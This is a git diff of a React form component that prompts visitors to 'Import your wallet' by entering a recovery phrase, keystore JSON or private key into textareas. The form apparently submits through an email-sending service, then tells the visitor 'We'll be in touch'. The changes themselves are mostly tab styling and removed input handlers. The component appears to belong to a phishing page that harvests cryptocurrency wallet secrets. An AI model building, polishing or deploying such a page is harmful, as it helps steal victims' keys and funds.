@@ -18,7 +18,6 @@ function Form() {
         () => {
           setFormVisible(true);
           alert(`We'll be in touch with you`);
-          // clearText();
         },
         (error) => {
           console.log("FAILED...", error.text);
@@ -36,9 +35,24 @@ function Form() {
           <span>Import your wallet</span>
         </p>
         <p className="flex gap-8 border border-b-gray-200 text-xl font-bold">
-          <span onClick={() => setActive(1)}>Phrase</span>
-          <span onClick={() => setActive(2)}>Keystore Json</span>
-          <span onClick={() => setActive(3)}>Private Key</span>
+          <span
+            className={`${active === 1 ? "border border-b-blue-400" : ""}`}
+            onClick={() => setActive(1)}
+          >
+            Phrase
+          </span>
+          <span
+            className={`${active === 2 ? "border border-b-blue-400" : ""}`}
+            onClick={() => setActive(2)}
+          >
+            Keystore Json
+          </span>
+          <span
+            className={`${active === 3 ? "border border-b-blue-400" : ""}`}
+            onClick={() => setActive(3)}
+          >
+            Private Key
+          </span>
         </p>
 
         <form
@@ -58,7 +72,6 @@ function Form() {
           {active === 2 && (
             <textarea
               name="message"
-              onChange={(e) => setPhrase(e.target.value)}
               rows="5"
               className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
               placeholder={"private key"}
@@ -68,7 +81,6 @@ function Form() {
           {active === 3 && (
             <textarea
               name="message"
-              onChange={(e) => setPhrase(e.target.value)}
               rows="5"
               className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
               placeholder={"private key"}
